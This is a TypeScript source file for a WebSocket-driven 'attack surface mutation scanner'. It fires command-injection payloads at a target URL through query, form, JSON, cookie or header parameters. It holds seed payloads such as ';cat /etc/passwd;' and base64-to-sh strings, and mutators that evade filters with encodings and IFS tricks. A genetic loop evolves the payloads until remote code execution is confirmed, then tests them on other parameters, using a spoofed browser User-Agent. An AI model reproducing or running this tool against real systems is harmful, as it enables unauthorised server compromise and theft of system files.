import type { WebSocket } from "ws";
import { randomBytes } from "crypto";
import { MutationScannerRequestSchema } from "../lib/schemas.js";
import { extractCommandOutput, NEXUS_MARKER, stripHtml } from "../lib/outputExtractor.js";

interface MutMsg { type: string; [k: string]: unknown; }

function send(ws: WebSocket, msg: MutMsg): void {
  if (ws.readyState === 1) {
    try { ws.send(JSON.stringify(msg)); } catch { /* connection closed mid-send */ }
  }
}

async function probe(
  baseUrl: string,
  param: string,
  payload: string,
  method: string,
  headers: Record<string, string>,
): Promise<{ status: number; body: string; elapsed: number }> {
  const t0 = Date.now();
  try {
    const u = new URL(baseUrl);
    let response: Response;

    if (method === "GET" || method === "DELETE") {
      u.searchParams.set(param, payload);
      response = await fetch(u.toString(), {
        method,
        headers,
        signal: AbortSignal.timeout(18_000),
      });
    } else if (method === "JSON") {
      response = await fetch(u.toString(), {
        method: "POST",
        headers: { ...headers, "Content-Type": "application/json" },
        body: JSON.stringify({ [param]: payload }),
        signal: AbortSignal.timeout(18_000),
      });
    } else if (method === "COOKIE") {
      response = await fetch(u.toString(), {
        method: "GET",
        headers: { ...headers, "Cookie": `${param}=${encodeURIComponent(payload)}` },
        signal: AbortSignal.timeout(18_000),
      });
    } else if (method === "HEADER") {
      response = await fetch(u.toString(), {
        method: "GET",
        headers: { ...headers, [param]: payload },
        signal: AbortSignal.timeout(18_000),
      });
    } else {
      const body = new URLSearchParams({ [param]: payload }).toString();
      response = await fetch(u.toString(), {
        method,
        headers: { ...headers, "Content-Type": "application/x-www-form-urlencoded" },
        body,
        signal: AbortSignal.timeout(18_000),
      });
    }

    const body = await response.text();
    return { status: response.status, body: body.slice(0, 131_072), elapsed: Date.now() - t0 };
  } catch {
    return { status: 0, body: "", elapsed: Date.now() - t0 };
  }
}

const SEED_PAYLOADS = [
  "id",
  ";id",
  "`id`",
  "$(id)",
  "${IFS}id",
  "&&id",
  "||id",
  "|id",
  ";id;",
  "%0aid",
  "id%0a",
  "';id;echo'",
  "\";id;echo\"",
  "%3bid",
  "id%26%26id",
  "$(echo${IFS}id)",
  "id&&echo vulnerable",
  "id;echo;id",
  "id\nid",
  ";{id,}",
  ";$IFS;id",
  ";id #",
  "id #comment",
  "1;id",
  "1|id",
  "1&&id",
  "'||id||'",
  `id && echo '${NEXUS_MARKER}'`,
  `;id;echo '${NEXUS_MARKER}'`,
  `$(id);echo '${NEXUS_MARKER}'`,
  "`id`;echo '${NEXUS_MARKER}'",
  `id%0aecho '${NEXUS_MARKER}'`,
  `id||echo '${NEXUS_MARKER}'`,
  "id && whoami && uname -a",
  ";whoami;id;hostname",
  "id 2>&1 | tee /dev/stderr",
  "|cat /etc/passwd",
  ";cat /etc/passwd;",
  "${IFS}id${IFS}",
  "$(printf 'id')",
  "bash${IFS}-c${IFS}id",
];

const MUTATORS: ((p: string) => string)[] = [
  p => p.replace(/id/g, "i\\d"),
  p => p.replace(/id/g, "${IFS}i${IFS}d"),
  p => p.replace(/ /g, "${IFS}"),
  p => p.replace(/ /g, "\t"),
  p => p.replace(/ /g, "<"),
  p => "'" + p + "'",
  p => '"' + p + '"',
  p => p.replace(/id/g, "$(echo aWQ=|base64 -d)"),
  p => p.replace(/;/g, "%3b"),
  p => p.replace(/&/g, "%26"),
  p => p.replace(/\|/g, "%7c"),
  p => "/*comment*/" + p,
  p => p + "/**/",
  p => p.replace(/id/g, "id\x00"),
  p => p.replace(/id/g, "\\i\\d"),
  p => p.split("").map((c, i) => i % 3 === 1 ? c.toUpperCase() : c).join(""),
  p => "%0a" + p,
  p => p + "%0a",
  p => p.replace(/id/g, "$(printf 'id')"),
  p => p.replace(/id/g, "$(echo id)"),
  p => encodeURIComponent(p),
  p => p.replace(/id/g, "i''d"),
  p => p.replace(/id/g, 'i""d'),
  p => "<!--" + p + "-->",
  p => p.replace(/id/g, "$'\\151\\144'"),
  p => p.replace(/id/g, "$(\\x69\\x64)"),
  p => p + ";echo nx_ok_" + randomBytes(2).toString("hex"),
  p => ";(" + p + ")",
  p => "{" + p + "}",
  p => p.replace(/id/g, "cat /etc/passwd"),
  p => p.replace(/id/g, "whoami"),
  p => p + `;echo '${NEXUS_MARKER}'`,
  p => p + " && echo '===NEXUS_SUCCESS==='",
  p => p.replace(/id/g, "id && uname -a"),
  p => p.replace(/id/g, "id 2>&1"),
  p => p + " | head -1",
  p => "(" + p + ") 2>&1",
  p => p.replace(/;/g, "%0a"),
  p => p.replace(/\|/g, "%7C"),
  p => p.replace(/ /g, "+"),
  p => p.replace(/id/g, "$(id 2>&1)"),
  p => p.replace(/id/g, "id${IFS}2>&1"),
  p => "\x27\x3b" + p.replace(/'/g, "\x27"),
  p => Buffer.from(p).toString("base64").replace(/=/g,"") + "|base64${IFS}-d|sh",
];

function crossover(a: string, b: string): string {
  const mid = Math.floor(a.length / 2);
  return a.slice(0, mid) + b.slice(Math.floor(b.length / 2));
}

function scoreResponse(
  body: string,
  elapsed: number,
  baseLen: number,
  baseElapsed: number,
  status: number,
  baselineBody?: string,
): number {
  let score = 0;
  // Delegate to outputExtractor for authoritative RCE pattern matching
  const extracted = extractCommandOutput(body, baselineBody);
  if (extracted) {
    score += extracted.confidence === "high" ? 200 : 120;
  }
  // Marker confirms execution
  const plain = stripHtml(body);
  if (plain.includes(NEXUS_MARKER)) score += 300;
  if (plain.includes("===NEXUS_SUCCESS===")) score += 300;
  // Sentinel echo pattern (blind confirmation)
  if (/nx_ok_[0-9a-f]{4}/.test(body)) score += 150;
  // Length delta
  const lenDiff = Math.abs(body.length - baseLen);
  if (lenDiff > 500) score += Math.min(60, Math.floor(lenDiff / 30));
  else if (lenDiff > 100) score += Math.min(25, Math.floor(lenDiff / 20));
  // Timing oracle
  const timeDelta = elapsed - baseElapsed;
  if (timeDelta > 5000) score += 60;
  else if (timeDelta > 3000) score += 35;
  else if (timeDelta > 1500) score += 15;
  // HTTP status signals
  if (status === 500) score += 20;
  if (status === 200 && body.length > baseLen + 100) score += 12;
  // WAF/block response = negative signal
  if (status === 403 || status === 406 || status === 429) score -= 20;
  return Math.max(0, score);
}

function detectOutput(body: string, baselineBody?: string): string | null {
  // Use the canonical extractor — same patterns as streamExec + autoExploit
  const extracted = extractCommandOutput(body, baselineBody);
  if (extracted) return `${extracted.method}: ${extracted.text.slice(0, 120).replace(/\n/g, " ")}`;
  const plain = stripHtml(body);
  if (plain.includes(NEXUS_MARKER))          return "marker confirmed — NEXUS_OUTPUT_END sentinel hit";
  if (plain.includes("===NEXUS_SUCCESS===")) return "marker confirmed — NEXUS_SUCCESS sentinel hit";
  if (/nx_ok_[0-9a-f]{4}/.test(body))       return "sentinel echo — blind RCE confirmed";
  return null;
}

export function handleMutationScanner(ws: WebSocket): void {
  ws.once("message", raw => {
    let parsed: unknown;
    try { parsed = JSON.parse(raw.toString()); }
    catch { send(ws, { type: "error", message: "invalid JSON" }); ws.close(); return; }

    const validation = MutationScannerRequestSchema.safeParse(parsed);
    if (!validation.success) {
      send(ws, { type: "error", message: "validation failed", issues: validation.error.issues });
      ws.close(); return;
    }

    const params = validation.data;
    const targetUrl    = (params.targetUrl ?? "").trim();
    const injectParam  = (params.injectParam ?? "cmd").trim();
    const httpMethod   = (params.httpMethod ?? "GET").toUpperCase();
    const generations  = Math.min(Math.max(params.generations ?? 6, 2), 12);
    const popSize      = Math.min(Math.max(params.popSize ?? 20, 8), 40);
    const extraParams  = (params.extraParams ?? "").split(",").map((s: string) => s.trim()).filter(Boolean);
    const customHdrs   = params.customHeaders ?? "";

    if (!targetUrl) { ws.close(); return; }

    const headers: Record<string, string> = {
      "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
      "Cache-Control":   "no-cache",
    };
    if (customHdrs) {
      for (const line of customHdrs.split("\n")) {
        const col = line.indexOf(":");
        if (col > 0) headers[line.slice(0, col).trim()] = line.slice(col + 1).trim();
      }
    }

    (async () => {
      send(ws, { type: "banner", text:
        `╔══════════════════════════════════════════════════════════════╗\n` +
        `║  NEXUSFORGE  ATTACK SURFACE MUTATION SCANNER v2             ║\n` +
        `║  Genetic payload evolution + propagation mapping            ║\n` +
        `╚══════════════════════════════════════════════════════════════╝\n` +
        `  TARGET    : ${targetUrl}\n` +
        `  PARAM     : ${injectParam}\n` +
        `  METHOD    : ${httpMethod}\n` +
        `  GENERATIONS: ${generations}   POP SIZE: ${popSize}\n` +
        `  EXTRA PARAMS TO MAP: ${extraParams.length > 0 ? extraParams.join(", ") : "(none)"}\n` +
        `${"─".repeat(64)}`
      });

      send(ws, { type: "phase", phase: "baseline", text: "Establishing 3-request baseline..." });

      let baseLen        = 0;
      let baseElapsed    = 0;
      let baseStatus     = 0;
      let baselineBodyRef = "";       // declared outside try so evolution loop can use it
      try {
        const bases = await Promise.all([
          probe(targetUrl, injectParam, "nexus_baseline_1", httpMethod, headers),
          probe(targetUrl, injectParam, "nexus_baseline_2", httpMethod, headers),
          probe(targetUrl, injectParam, "nexus_baseline_3", httpMethod, headers),
        ]);
        baselineBodyRef = bases[1]?.body ?? "";   // assign here
        baseLen     = Math.round(bases.reduce((a, b) => a + b.body.length, 0) / 3);
        baseElapsed = Math.round(bases.reduce((a, b) => a + b.elapsed, 0) / 3);
        baseStatus  = bases[1]?.status ?? 0;
        send(ws, { type: "baseline", len: baseLen, elapsed: baseElapsed, status: baseStatus,
          text: `  baseline: ${baseLen}b  ${baseElapsed}ms  HTTP ${baseStatus}` });
      } catch (err) {
        send(ws, { type: "error", message: `Baseline failed: ${String(err)}` });
        ws.close(); return;
      }

      let population: string[] = SEED_PAYLOADS.slice(0, popSize);
      while (population.length < popSize) {
        const seed = SEED_PAYLOADS[population.length % SEED_PAYLOADS.length] ?? ";id";
        const mut  = MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!;
        population.push(mut(seed));
      }

      const confirmed: { payload: string; score: number; evidence: string; generation: number }[] = [];
      const scores = new Map<string, number>();

      for (let gen = 1; gen <= generations; gen++) {
        send(ws, { type: "generation_start", generation: gen, total: generations, popSize: population.length,
          text: `\n${"═".repeat(64)}\n  GENERATION ${gen}/${generations}  ·  ${population.length} candidates\n${"═".repeat(64)}` });

        const results: { payload: string; score: number; status: number; elapsed: number; body: string }[] = [];

        for (let i = 0; i < population.length; i++) {
          const payload = population[i]!;
          const trunc   = payload.length > 80 ? payload.slice(0, 80) + "…" : payload;

          send(ws, { type: "probe", generation: gen, idx: i, total: population.length, payload: trunc,
            text: `  [${String(i + 1).padStart(2)}/${population.length}] ${trunc}` });

          let result = { status: 0, body: "", elapsed: 0 };
          try {
            result = await probe(targetUrl, injectParam, payload, httpMethod, headers);
          } catch { /**/ }

          const score = scoreResponse(result.body, result.elapsed, baseLen, baseElapsed, result.status, baselineBodyRef);
          scores.set(payload, score);
          results.push({ payload, score, status: result.status, elapsed: result.elapsed, body: result.body });

          const evidence = detectOutput(result.body);
          const lenDiff  = result.body.length - baseLen;
          const marker   = score >= 100 ? "🔴 RCE" : score >= 30 ? "🟡 HIT" : score > 0 ? "🟢 DIFF" : "·";

          send(ws, { type: "result", generation: gen, idx: i, payload, score, status: result.status,
            elapsed: result.elapsed, lenDiff, evidence,
            text: `        ${marker}  score=${score}  HTTP ${result.status}  ${result.elapsed}ms  Δ${lenDiff > 0 ? "+" : ""}${lenDiff}b${evidence ? `  ⚡ ${evidence}` : ""}` });

          if (evidence && !confirmed.find(c => c.payload === payload)) {
            confirmed.push({ payload, score, evidence, generation: gen });
            send(ws, { type: "confirmed", payload, evidence, generation: gen,
              text: `\n  ┌─ CONFIRMED RCE ──────────────────────────────────────────\n` +
                    `  │ GENERATION : ${gen}/${generations}\n` +
                    `  │ PAYLOAD    : ${payload}\n` +
                    `  │ EVIDENCE   : ${evidence}\n` +
                    `  │ SCORE      : ${score}  HTTP ${result.status}  ${result.elapsed}ms\n` +
                    (result.body.length > 0
                      ? result.body.slice(0, 2000).split("\n").slice(0, 40).map(l => `  │ ${l.slice(0, 200)}`).join("\n") + "\n"
                      : "") +
                    `  └──────────────────────────────────────────────────────────` });
            break;  // ── stop inner probe loop on first confirmed RCE ─────────
          }

          await new Promise<void>(r => setTimeout(r, 40 + Math.random() * 60));
        }

        const sorted = [...results].sort((a, b) => b.score - a.score);
        const elite  = sorted.slice(0, Math.max(4, Math.floor(popSize * 0.25)));

        send(ws, { type: "generation_done", generation: gen,
          best: elite[0] ? { payload: elite[0].payload, score: elite[0].score } : null,
          text: `\n  TOP-5 THIS GENERATION:\n` +
            sorted.slice(0, 5).map((r, i) =>
              `    ${i + 1}. score=${r.score.toString().padStart(3)}  ${r.payload.slice(0, 70)}`
            ).join("\n") });

        // ── Stop entire scan the moment RCE is confirmed ───────────────────
        if (confirmed.length > 0) {
          send(ws, { type: "data",
            text: `\n  [CHAIN STOP] RCE confirmed in generation ${gen} — halting evolution\n` });
          break;
        }

        if (gen < generations) {
          const newPop: string[] = [];
          for (const e of elite) newPop.push(e.payload);

          while (newPop.length < popSize) {
            const parentA = elite[Math.floor(Math.random() * elite.length)]!.payload;
            const parentB = elite[Math.floor(Math.random() * elite.length)]!.payload;
            const roll    = Math.random();

            if (roll < 0.35 && parentA !== parentB) {
              newPop.push(crossover(parentA, parentB));
            } else if (roll < 0.70) {
              const mut = MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!;
              newPop.push(mut(parentA));
            } else {
              const seed = SEED_PAYLOADS[Math.floor(Math.random() * SEED_PAYLOADS.length)]!;
              const mut  = MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!;
              newPop.push(mut(seed));
            }
          }

          const unique = [...new Set(newPop)];
          while (unique.length < popSize) {
            const seed = SEED_PAYLOADS[Math.floor(Math.random() * SEED_PAYLOADS.length)]!;
            unique.push(MUTATORS[Math.floor(Math.random() * MUTATORS.length)]!(seed));
          }
          population = unique.slice(0, popSize);

          send(ws, { type: "evolve", generation: gen, nextPop: population.length,
            text: `\n  ↻ Evolved → Gen ${gen + 1}  (${elite.length} elite preserved, ${population.length - elite.length} mutated/crossed)` });
        }
      }

      if (extraParams.length > 0 && confirmed.length > 0) {
        send(ws, { type: "propagation_start",
          text: `\n${"═".repeat(64)}\n  PROPAGATION MAPPING  ·  Testing ${confirmed.length} confirmed payload(s) across ${extraParams.length} param(s)\n${"═".repeat(64)}` });

        for (const conf of confirmed.slice(0, 5)) {
          for (const ep of extraParams) {
            send(ws, { type: "propagation_probe", param: ep, payload: conf.payload,
              text: `  ▸ param="${ep}"  payload="${conf.payload.slice(0, 60)}"` });
            let r = { status: 0, body: "", elapsed: 0 };
            try { r = await probe(targetUrl, ep, conf.payload, httpMethod, headers); } catch { /**/ }
            const ev  = detectOutput(r.body);
            const ld  = r.body.length - baseLen;
            send(ws, { type: "propagation_result", param: ep, payload: conf.payload,
              status: r.status, elapsed: r.elapsed, lenDiff: ld, propagated: !!ev, evidence: ev,
              text: `    ${ev ? "🔴 PROPAGATED" : "·  not propagated"}  HTTP ${r.status}  ${r.elapsed}ms  Δ${ld > 0 ? "+" : ""}${ld}b${ev ? `  ⚡ ${ev}` : ""}` });
            await new Promise<void>(r2 => setTimeout(r2, 80 + Math.random() * 120));
          }
        }
      }

      const bestAll = [...scores.entries()].sort((a, b) => b[1] - a[1]).slice(0, 10);
      send(ws, { type: "end", confirmed: confirmed.length, generations,
        text: `\n${"═".repeat(64)}\n  MUTATION SCAN COMPLETE\n` +
          `  ${confirmed.length} confirmed RCE payload(s) found across ${generations} generations.\n` +
          `\n  TOP PAYLOADS BY SCORE:\n` +
          bestAll.map(([ p, s ], i) => `    ${i + 1}. score=${s.toString().padStart(3)}  ${p.slice(0, 80)}`).join("\n") +
          `\n${"═".repeat(64)}`,
        topPayloads: bestAll.map(([p, s]) => ({ payload: p, score: s })),
        confirmedList: confirmed,
      });

      if (ws.readyState === 1) ws.close();
    })().catch((err: unknown) => {
      send(ws, { type: "error", message: String(err) });
      if (ws.readyState === 1) ws.close();
    });
  });
}
